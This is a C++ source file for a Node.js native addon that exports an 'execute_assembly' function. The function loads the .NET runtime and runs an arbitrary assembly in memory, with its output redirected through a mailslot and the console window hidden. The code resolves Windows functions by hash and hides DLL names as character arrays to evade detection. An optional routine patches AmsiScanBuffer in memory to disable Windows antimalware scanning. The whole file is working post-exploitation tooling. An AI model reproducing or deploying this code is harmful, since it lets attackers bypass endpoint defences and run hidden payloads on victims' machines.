#include <windows.h>
#include <napi.h>
#include <stdio.h>
#include <winhttp.h>
#include "clr.h"

#define D_API( x ) decltype( x ) * x;

#define H_API_CREATEMAILSLOTA           0x906d962da6b14d2a
#define H_API_CREATEEVENTA              0x9b7aa49e29831332
#define H_API_GETMAILSLOTINFO           0x58bf8a3cba600e76
#define H_API_GLOBALALLOC               0x28ecb623628a39ee
#define H_API_GLOBALFREE                0xb8a3b2d888f29a48
#define H_API_READFILE                  0x9ca6da88962a40
#define H_API_CLOSEHANDLE               0x28ffa46b60aa287e
#define H_API_GETCONSOLEWINDOW          0xf8e2a52698060243
#define H_API_CREATEFILEA               0xca6dea92258a917f
#define H_API_ALLOCCONSOLE              0x28ef3e383f8f95ca
#define H_API_GETCONSOLEWINDOW          0xf8e2a52698060243
#define H_API_GETSTDHANDLE              0xa7faa86b60ab97e7
#define H_API_SETSTDHANDLE              0xa7faa86b60ab8be7
#define H_API_FREECONSOLE               0xca693e383f8e2863

#define H_API_CLRCREATEINSTANCE         0xaa45ee3c1c8181f7

#define H_API_SAFEARRAYCREATE           0xcf2dd4fdae69b177
#define H_API_SAFEARRAYACCESSDATA       0xd86c5986f666b514
#define H_API_SAFEARRAYUNACCESSDATA     0x2508127a3b544129
#define H_API_SAFEARRAYCREATEVECTOR     0xe69b10055898ef5a
#define H_API_SAFEARRAYPUTELEMENT       0xecfcd8312956d9d5
#define H_API_SAFEARRAYDESTROY          0xcb752a3f2765ef33
#define H_API_SYSALLOCSTRING            0x28a3bdfeb6948bf6
#define H_API_VARIANTCLEAR              0xc96d83a3e2a67637

#define H_API_SHOWWINDOW                0xf9a3edb960aa3ec9

#define intZeroMemory(addr,size) memset((addr),0,size)
#define intAlloc(size) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size)
#define memset memset
#define stdout (__acrt_iob_func(1))

#ifdef _DEBUG
#define DPRINT(...) printf( __VA_ARGS__ )
#else
#define DPRINT(...)
#endif
using namespace Napi;

typedef struct _APIS {
    D_API(CLRCreateInstance);
    D_API(CreateMailslotA);
    D_API(CreateEventA);
    D_API(GetMailslotInfo);
    D_API(GlobalAlloc);
    D_API(CreateFileA);
    D_API(ReadFile);
    D_API(GlobalFree);
    D_API(CloseHandle);
    D_API(AllocConsole);
    D_API(GetConsoleWindow);
    D_API(GetStdHandle);
    D_API(SetStdHandle);
    D_API(FreeConsole);

    D_API(SafeArrayCreate);
    D_API(SafeArrayAccessData);
    D_API(SafeArrayUnaccessData);
    D_API(SafeArrayCreateVector);
    D_API(SafeArrayPutElement);
    D_API(SafeArrayDestroy);
    D_API(SysAllocString);
    D_API(VariantClear);

    D_API(ShowWindow);
} APIS, * PAPIS;

APIS Api = { 0 };

extern "C" SIZE_T Hasher1(INT sz, LPSTR str);

INT StringLengthA(char* string22)
{
    int length = 0;
    int stringmax = 2000;
    while (length < stringmax) {
        if (string22[length] == 0x00) {
            break;
        }
        length++;
    }
    return length;
}

// Does not handle forwaders
void xGetProcAddr(PVOID pe, SIZE_T api_hash, PHANDLE api_addr)
{
    int* AddressOfFunctions = NULL;
    int* AddressOfNames = NULL;
    short* AddressOfNameOrdinals = NULL;
    char* export_name = NULL;

    PIMAGE_NT_HEADERS       nt = (PIMAGE_NT_HEADERS)(((PBYTE)(pe)) + ((PIMAGE_DOS_HEADER)pe)->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY dir = (PIMAGE_EXPORT_DIRECTORY)(((PBYTE)(pe)) + (&nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT])->VirtualAddress);

    AddressOfFunctions = (int*)(((PBYTE)(pe)) + dir->AddressOfFunctions);
    AddressOfNameOrdinals = (short*)(((PBYTE)(pe)) + dir->AddressOfNameOrdinals);
    AddressOfNames = (int*)(((PBYTE)(pe)) + dir->AddressOfNames);

    for (DWORD i = 0; i < dir->NumberOfNames; i++)
    {
        export_name = (PCHAR)(((PBYTE)(pe)) + AddressOfNames[i]);
        if (Hasher1(StringLengthA(export_name), export_name) == api_hash)
        {
            *api_addr = (HANDLE*)(((PBYTE)(pe)) + AddressOfFunctions[AddressOfNameOrdinals[i]]);
        }
    }
}

// Spider
SIZE_T ACharStringToWCharString(PWCHAR Destination, PCHAR Source, SIZE_T MaximumAllowed)
{
    INT Length = MaximumAllowed;

    while (--Length >= 0)
    {
        if (!(*Destination++ = *Source++))
            return MaximumAllowed - Length - 1;
    }

    return MaximumAllowed - Length;
}

VOID ResolveApis() {
    CHAR    k32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', '\0' };
    CHAR    o32[] = { 'o','l','e','a','u','t','3','2','.','d','l','l', '\0' };
    CHAR    u32[] = { 'u','s','e','r','3','2','.','d','l','l', '\0' };
    CHAR    msc[] = { 'm', 's', 'c', 'o', 'r', 'e', 'e', '.', 'd', 'l', 'l', '\0' };

    PVOID  a_k32 = LoadLibraryA(k32);
    PVOID  a_u32 = LoadLibraryA(u32);
    PVOID  a_o32 = LoadLibraryA(o32);
    PVOID  a_msc = LoadLibraryA(msc);

    xGetProcAddr(a_k32, H_API_CREATEMAILSLOTA, (PHANDLE)&Api.CreateMailslotA);
    xGetProcAddr(a_k32, H_API_CREATEEVENTA, (PHANDLE)&Api.CreateEventA);
    xGetProcAddr(a_k32, H_API_GETMAILSLOTINFO, (PHANDLE)&Api.GetMailslotInfo);
    xGetProcAddr(a_k32, H_API_GLOBALALLOC, (PHANDLE)&Api.GlobalAlloc);
    xGetProcAddr(a_k32, H_API_CREATEFILEA, (PHANDLE)&Api.CreateFileA);
    xGetProcAddr(a_k32, H_API_READFILE, (PHANDLE)&Api.ReadFile);
    xGetProcAddr(a_k32, H_API_GLOBALFREE, (PHANDLE)&Api.GlobalFree);
    xGetProcAddr(a_k32, H_API_CLOSEHANDLE, (PHANDLE)&Api.CloseHandle);
    xGetProcAddr(a_k32, H_API_ALLOCCONSOLE, (PHANDLE)&Api.AllocConsole);
    xGetProcAddr(a_k32, H_API_GETCONSOLEWINDOW, (PHANDLE)&Api.GetConsoleWindow);
    xGetProcAddr(a_k32, H_API_GETSTDHANDLE, (PHANDLE)&Api.GetStdHandle);
    xGetProcAddr(a_k32, H_API_SETSTDHANDLE, (PHANDLE)&Api.SetStdHandle);
    xGetProcAddr(a_k32, H_API_FREECONSOLE, (PHANDLE)&Api.FreeConsole);

    xGetProcAddr(a_o32, H_API_SAFEARRAYCREATE, (PHANDLE)&Api.SafeArrayCreate);
    xGetProcAddr(a_o32, H_API_SAFEARRAYACCESSDATA, (PHANDLE)&Api.SafeArrayAccessData);
    xGetProcAddr(a_o32, H_API_SAFEARRAYUNACCESSDATA, (PHANDLE)&Api.SafeArrayUnaccessData);
    xGetProcAddr(a_o32, H_API_SAFEARRAYCREATEVECTOR, (PHANDLE)&Api.SafeArrayCreateVector);
    xGetProcAddr(a_o32, H_API_SAFEARRAYPUTELEMENT, (PHANDLE)&Api.SafeArrayPutElement);
    xGetProcAddr(a_o32, H_API_SAFEARRAYDESTROY, (PHANDLE)&Api.SafeArrayDestroy);
    xGetProcAddr(a_o32, H_API_SYSALLOCSTRING, (PHANDLE)&Api.SysAllocString);
    xGetProcAddr(a_o32, H_API_VARIANTCLEAR, (PHANDLE)&Api.VariantClear);

    xGetProcAddr(a_msc, H_API_CLRCREATEINSTANCE, (PHANDLE)&Api.CLRCreateInstance);

    xGetProcAddr(a_u32, H_API_SHOWWINDOW, (PHANDLE)&Api.ShowWindow);
}

/*Make MailSlot*/
BOOL WINAPI MakeSlot(LPCSTR lpszSlotName, HANDLE* mailHandle)
{

    *mailHandle = Api.CreateMailslotA(
        lpszSlotName,
        0,                             //No maximum message size 
        MAILSLOT_WAIT_FOREVER,         //No time-out for operations 
        (LPSECURITY_ATTRIBUTES)NULL);  //Default security

    if (*mailHandle == INVALID_HANDLE_VALUE)
    {
        return FALSE;
    }
    else
        return TRUE;
}

/*Read Mailslot*/
BOOL ReadSlot(char* output, HANDLE* mailHandle)
{
    DWORD cbMessage = 0;
    DWORD cMessage = 0;
    DWORD cbRead = 0;
    BOOL fResult;
    LPSTR lpszBuffer = NULL;
    size_t size = 65535;
    char* achID = (char*)intAlloc(size);
    memset(achID, 0, size);
    DWORD cAllMessages = 0;
    HANDLE hEvent;
    OVERLAPPED ov;

    hEvent = Api.CreateEventA(NULL, FALSE, FALSE, NULL);
    if (NULL == hEvent)
        return FALSE;
    ov.Offset = 0;
    ov.OffsetHigh = 0;
    ov.hEvent = hEvent;

    fResult = Api.GetMailslotInfo(*mailHandle, //Mailslot handle 
        (LPDWORD)NULL,               //No maximum message size 
        &cbMessage,                  //Size of next message 
        &cMessage,                   //Number of messages 
        (LPDWORD)NULL);              //No read time-out 

    if (!fResult)
    {
        return FALSE;
    }

    if (cbMessage == MAILSLOT_NO_MESSAGE)
    {
        return TRUE;
    }

    cAllMessages = cMessage;

    while (cMessage != 0)  //Get all messages
    {
        //Allocate memory for the message. 
        lpszBuffer = (LPSTR)Api.GlobalAlloc(GPTR, lstrlenA((LPSTR)achID) * sizeof(CHAR) + cbMessage);
        if (NULL == lpszBuffer)
            return FALSE;
        lpszBuffer[0] = '\0';

        fResult = Api.ReadFile(*mailHandle,
            lpszBuffer,
            cbMessage,
            &cbRead,
            &ov);

        if (!fResult)
        {
            Api.GlobalFree((HGLOBAL)lpszBuffer);
            return FALSE;
        }

        //Copy mailslot output to returnData buffer
        _snprintf(output + strlen(output), strlen(lpszBuffer) + 1, "%s", lpszBuffer);

        fResult = Api.GetMailslotInfo(*mailHandle,  //Mailslot handle 
            (LPDWORD)NULL,               //No maximum message size 
            &cbMessage,                  //Size of next message 
            &cMessage,                   //Number of messages 
            (LPDWORD)NULL);              //No read time-out 

        if (!fResult)
        {
            return FALSE;
        }

    }

    cbMessage = 0;
    Api.GlobalFree((HGLOBAL)lpszBuffer);
    Api.CloseHandle(hEvent);
    return TRUE;
}

BOOL consoleExists() {
    return !!Api.GetConsoleWindow();
}

BOOL FindVersion(PBYTE assembly, DWORD64 length) {
    PBYTE assembly_c = assembly;
    char v4[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };

    for (DWORD64 i = 0; i < length; i++)
    {
        for (DWORD64 j = 0; j < 10; j++)
        {
            if (v4[j] != assembly_c[i + j])
            {
                break;
            }
            else
            {
                if (j == 9)
                {
                    return 1;
                }
            }
        }
    }

    return 0;
}

DWORD StartCLR(
    LPCWSTR dotNetVersion,
    OUT ICLRMetaHost** ppClrMetaHost,
    OUT ICLRRuntimeInfo** ppClrRuntimeInfo,
    OUT ICorRuntimeHost** ppICorRuntimeHost,
    OUT ICLRRuntimeHost** ppICLRRuntimeHost,
    OUT ICLRControl** ppICLRControl,
    OUT ICLRGCManager** ppICLRGCManager,
    OUT AppDomain** ppAppDomain) {

    //Declare variables
    HRESULT hr = NULL;

    //Get the CLRMetaHost that tells us about .NET on this machine
    hr = Api.CLRCreateInstance(xCLSID_CLRMetaHost, xIID_ICLRMetaHost, (LPVOID*)ppClrMetaHost);

    if (hr == S_OK)
    {
        //Get the runtime information for the particular version of .NET
        hr = (*ppClrMetaHost)->GetRuntime(dotNetVersion, xIID_ICLRRuntimeInfo, (LPVOID*)ppClrRuntimeInfo);
        if (hr == S_OK)
        {
            /*Check if the specified runtime can be loaded into the process. This method will take into account other runtimes that may already be
            loaded into the process and set fLoadable to TRUE if this runtime can be loaded in an in-process side-by-side fashion.*/
            BOOL fLoadable;
            hr = (*ppClrRuntimeInfo)->IsLoadable(&fLoadable);
            if ((hr == S_OK) && fLoadable)
            {

                //Load the CLR into the current process and return a runtime interface pointer.
                hr = (*ppClrRuntimeInfo)->GetInterface(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost, (LPVOID*)ppICLRRuntimeHost);
                IUnknown* pAppDomainThunk = NULL;
                if (hr == S_OK)
                {
                    // Get the GCManager interface so we can actually free stuff after unloading the appdomain via forcing GC
                    (*ppICLRRuntimeHost)->GetCLRControl(ppICLRControl);
                    (*ppICLRControl)->GetCLRManager(IID_ICLRGCManager, (LPVOID*)ppICLRGCManager);

                    // Start it
                    (*ppICLRRuntimeHost)->Start();

                    // Apparently you can load COR Runtime after you start ICLRRuntime
                    hr = (*ppClrRuntimeInfo)->GetInterface(xCLSID_CorRuntimeHost, xIID_ICorRuntimeHost, (LPVOID*)ppICorRuntimeHost);
                    if (hr == S_OK)
                    {
                        // TODO: CHANGE
                        hr = (*ppICorRuntimeHost)->CreateDomain(L"yay", NULL, &pAppDomainThunk);
                        if (hr == S_OK)
                        {
                            hr = pAppDomainThunk->QueryInterface(xIID_AppDomain, (LPVOID*)ppAppDomain);
                            if (hr == S_OK)
                            {
                                return hr;
                            }
                            else
                            {
                                DPRINT("[-] We could not query the AppDomain interface: 0x%llx\n", hr);
                                return hr;
                            }
                        }
                        else
                        {
                            DPRINT("[-] We could not create our own AppDomain: 0x%llx\n", hr);
                            return hr;
                        }
                    }
                    else
                    {
                        DPRINT("[-] We could not get ICorRuntimeHost: 0x%llx\n", hr);
                        return hr;
                    }

                }
                else
                {
                    //If CLR fails to load fail gracefully
                    DPRINT("[-] Process refusing to get interface of %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
                    return hr;
                }
            }
            else
            {
                //If CLR fails to load fail gracefully
                DPRINT("[-] Process refusing to load %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
                return hr;
            }
        }
        else
        {
            //If CLR fails to load fail gracefully
            DPRINT("[-] Process refusing to get runtime of %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
            return hr;
        }
    }
    else
    {
        //If CLR fails to load fail gracefully
        DPRINT("[-] Process refusing to create %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
        return hr;
    }

    //CLR loaded successfully
    return hr;
}

PCHAR RunAssembly(PBYTE AssemblyBuffer, DWORD AssemblySize, AppDomain* pAppDomain, ICorRuntimeHost* pICorRuntimeHost, ICLRGCManager* pICLRGCManager, int argc, PWCHAR argv[]) {

    HRESULT        hr = S_OK;
    Assembly* pAssembly = NULL;
    MethodInfo* pMethodInfo = NULL;
    VARIANT        vtPsa = { 0 };
    SAFEARRAYBOUND rgsabound[1] = { 0 };
    SAFEARRAY* pSafeArray = NULL;
    PVOID          pvData = NULL;
    VARIANT        retVal = { 0 };
    VARIANT        obj = { 0 };
    long           idx[1] = { 0 };
    SAFEARRAY* psaStaticMethodArgs = NULL;

    HANDLE stdOutput = NULL;
    HANDLE stdError = NULL;
    HANDLE mainHandle = NULL;
    HANDLE hFile = NULL;
    // \\.\mailslot\_node
    CHAR   slotPath[] = { '\\', '\\', '.', '\\', 'm', 'a', 'i', 'l', 's', 'l', 'o', 't', '\\', '_', 'n', 'o', 'd', 'e', '\0' }; // TODO: CHANGE THIS
    BOOL   success = 1;
    size_t size = 65535;

    char* returnData = (char*)intAlloc(size);
    memset(returnData, 0, size);

    ZeroMemory(&retVal, sizeof(VARIANT));
    ZeroMemory(&obj, sizeof(VARIANT));

    // Prep SafeArray
    rgsabound[0].cElements = AssemblySize;
    rgsabound[0].lLbound = 0;
    pSafeArray = Api.SafeArrayCreate(VT_UI1, 1, rgsabound);
    Api.SafeArrayAccessData(pSafeArray, &pvData);
    memcpy(pvData, AssemblyBuffer, AssemblySize);

    // Prep AppDomain and EntryPoint
    hr = pAppDomain->lpVtbl->Load_3(pAppDomain, pSafeArray, &pAssembly);
    if (hr != S_OK) {
        sprintf(returnData, "[-] Process refusing to load Assembly: 0x%llx\n", hr);
        return returnData;
    }
    hr = pAssembly->lpVtbl->EntryPoint(pAssembly, &pMethodInfo);
    if (hr != S_OK) {
        sprintf(returnData, "[-] Process refusing to find entry point of assembly: 0x%llx\n", hr);
        return returnData;
    }

    Api.SafeArrayUnaccessData(pSafeArray);

    // Something
    obj.vt = VT_NULL;

    // Change cElement to the number of Main arguments
    psaStaticMethodArgs = Api.SafeArrayCreateVector(VT_VARIANT, 0, (ULONG)1); //Last field -> entryPoint == 1 is needed if Main(String[] args) 0 if Main()
    vtPsa.vt = (VT_ARRAY | VT_BSTR);
    vtPsa.parray = Api.SafeArrayCreateVector(VT_BSTR, 0, argc);
    for (LONG i = 0; i < argc; i++) {
        DPRINT("Putting arg: %S\n", argv[i]);
        Api.SafeArrayPutElement(vtPsa.parray, &i, Api.SysAllocString(argv[i])); // bud is NOT getting freed 
    }
    // Insert an array of BSTR into the VT_VARIANT psaStaticMethodArgs array
    Api.SafeArrayPutElement(psaStaticMethodArgs, idx, &vtPsa);

    // Redirect stdout via mailslot
    // Create the mailslot
    success = MakeSlot(slotPath, &mainHandle);

    // Get a handle to our pipe or mailslot
    hFile = Api.CreateFileA(slotPath, GENERIC_WRITE, FILE_SHARE_READ, (LPSECURITY_ATTRIBUTES)NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, (HANDLE)NULL);

    // Attach or create console
    BOOL frConsole = 0;
    BOOL attConsole = consoleExists();

    if (attConsole != 1)
    {
        frConsole = 1;
        Api.AllocConsole();

        //Hide Console Window
        HWND wnd = Api.GetConsoleWindow();
        if (wnd)
            Api.ShowWindow(wnd, SW_HIDE);
    }

    //Get current stdout handle so we can revert stdout after we finish
    stdOutput = Api.GetStdHandle(((DWORD)-11));

    //Set stdout to our newly created named pipe or mail slot
    success = Api.SetStdHandle(((DWORD)-11), hFile);

    // Done redirecting

    //Invoke our .NET Method
    hr = pMethodInfo->lpVtbl->Invoke_3(pMethodInfo, obj, psaStaticMethodArgs, &retVal);

    if (hr == S_OK) {
        DPRINT("Assembly executed successfully\n");

        // Clean up our appdomain. DOES NOT ACTUALLY CLEAR OUR ASSEMBLY FROM MEMORY THOUGH
        hr = pICorRuntimeHost->UnloadDomain((IUnknown*)pAppDomain);
        if (hr == S_OK) {

            DPRINT("Appdomain unloaded successfully\n");
            // Force the GC. Doesn't actually clear the assembly from memory!
            // hr = pICLRGCManager->Collect( -1 );
            // if ( hr != S_OK ){
            //     DPRINT( "We could not force garbage collection\n" );
            // }
        }
        else {
            DPRINT("We could not unload the AppDomain\n");
        }

        DPRINT("Reading from slot\n");
        // Read from mailslot
        success = ReadSlot(returnData, &mainHandle);
        DPRINT("Done\n");
    }
    else {
        sprintf(returnData, "Error executing the assembly with Invoke_3: 0x%llx\n", hr);
    }


    // Free the safearray stuff
    Api.SafeArrayDestroy(pSafeArray);
    Api.VariantClear(&retVal);
    Api.VariantClear(&obj);
    Api.VariantClear(&vtPsa);

    // Fix the output
    // Close handles
    Api.CloseHandle(mainHandle);
    Api.CloseHandle(hFile);

    //Revert stdout back to original handles
    success = Api.SetStdHandle(((DWORD)-11), stdOutput);

    //Free console only if we attached one
    if (frConsole != 0) {
        success = Api.FreeConsole();
    }

    return returnData;
}

VOID BasicPatch() {
    PVOID Func = NULL;
    CHAR  amsi[] = { 'a', 'm', 's', 'i', '.', 'd', 'l', 'l', '\0' };
    BYTE  patch[] = { 0x90, 0x90, 0x90, 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    DWORD _ = NULL;

    #define H_API_AMSISCANBUFFER 0xfbed80ce634a1f15
    xGetProcAddr(LoadLibraryA(amsi), H_API_AMSISCANBUFFER, (PHANDLE)&Func);

    DPRINT("Protecting amsi scanbuffer RWX\n");
    VirtualProtect(Func, sizeof(patch), PAGE_EXECUTE_READWRITE, &_);
    DPRINT("Patching\n");
    memcpy(Func, patch, sizeof(patch));
    VirtualProtect(Func, sizeof(patch), PAGE_EXECUTE_READ, &_);
    DPRINT("Patched\n");
    return;
}
// execute_assembly ( [assembly bytes], [patch:true|not], [args])
Napi::String ExecuteAssembly(const Napi::CallbackInfo& info) {

    Napi::Env env = info.Env();

    // Check the number of arguments
    if (info.Length() < 3) {
        Napi::TypeError::New(env, "Expected three arguments").ThrowAsJavaScriptException();
        return Napi::String();
    }

    // Check the types of arguments
    if (!info[0].IsBuffer() || !info[1].IsBoolean() || !info[2].IsArray()) {
        Napi::TypeError::New(env, "Expected a byte buffer, a boolean, a string array").ThrowAsJavaScriptException();
        return Napi::String();
    }

    // Extract the byte array
    Napi::Buffer<uint8_t> AsmBuf = info[0].As<Napi::Buffer<uint8_t>>();
    PBYTE   AssemblyBytes = AsmBuf.Data();
    SIZE_T  AssemblyLength = AsmBuf.ByteLength();
    DPRINT("AsmBuf 0x%llx\n", AssemblyBytes);
    DPRINT("AsmLen 0x%llx\n", AssemblyLength);

    // Extract the boolean
    Napi::Boolean doPatch = info[1].As<Napi::Boolean>();
    DPRINT("doPatch %d\n", doPatch.Value());

    // Extract the string array
    Napi::Array jsArray = info[2].As<Napi::Array>();
    uint32_t nArgs = jsArray.Length();
    PWCHAR* Args = new PWCHAR[nArgs];

    for (uint32_t i = 0; i < nArgs; ++i) {
        Napi::Value element = jsArray[i];
        if (!element.IsString()) {
            Napi::TypeError::New(env, "Expected all elements in the array to be strings").ThrowAsJavaScriptException();
            delete[] Args;  // Clean up previously allocated memory
            return Napi::String();
        }

        // Convert Napi::String to UTF-16 std::u16string
        std::u16string utf16str = element.As<Napi::String>().Utf16Value();

        // Allocate memory for the wide character string and copy contents
        wchar_t* wideBuffer = new wchar_t[utf16str.length() + 1];
        std::memcpy(wideBuffer, utf16str.c_str(), (utf16str.length() + 1) * sizeof(char16_t));

        // Store the wide character string in the array
        Args[i] = wideBuffer;
        DPRINT("Arg %d: %S\n", i, Args[i]);
    }

    // Extract the # of args
    DPRINT("Argc: %d\n", nArgs);

    LPCWSTR          NetVersion = NULL;
    ICLRMetaHost*    pClrMetaHost = NULL;
    ICLRRuntimeInfo* pClrRuntimeInfo = NULL;
    ICorRuntimeHost* pICorRuntimeHost = NULL;
    ICLRRuntimeHost* pICLRRuntimeHost = NULL;
    ICLRControl*     pICLRControl = NULL;
    ICLRGCManager* pICLRGCManager = NULL;
    AppDomain*       pAppDomain = NULL;
    PCHAR            output = NULL;
    Napi::String     Ret;
    HRESULT          hr = NULL;

    if (FindVersion(AssemblyBytes, AssemblyLength))
    {
        NetVersion = L"v4.0.30319";
    }
    else
    {
        NetVersion = L"v2.0.50727";
    }
    DPRINT("NetVerison: %S\n", NetVersion);
    if (hr = StartCLR(NetVersion, &pClrMetaHost, &pClrRuntimeInfo, &pICorRuntimeHost, &pICLRRuntimeHost, &pICLRControl, &pICLRGCManager, &pAppDomain) == S_OK) {
        if (doPatch.Value()) {
            BasicPatch();
        }
        output = RunAssembly(AssemblyBytes, AssemblyLength, pAppDomain, pICorRuntimeHost, pICLRGCManager, nArgs, Args);
        Ret = Napi::String::New(env, output);

    }
    else {
        Ret = Napi::String::New(env, "Some error occured in some step while loading the CLR: 0x%llx\n", hr);
    }

    // Clean up allocated memory for args
    for (uint32_t i = 0; i < nArgs; ++i) {
        delete[] Args[i];
    }
    delete[] Args;

    // This actually zeros the real buffer from javascript's end! JS caller should not expect this buffer to still contain the assembly!
    // If you don't plan on reusing the buffer, or the buffer is repopulated on every execute_assembly call, feel free to uncomment this
    //ZeroMemory(AssemblyBytes, AssemblyLength);
    return Ret;

}

Napi::Object Init(Napi::Env env, Napi::Object exports) {
    ResolveApis();
    exports.Set("execute_assembly", Napi::Function::New(env, ExecuteAssembly));
    return exports;
}

NODE_API_MODULE(addon, Init)
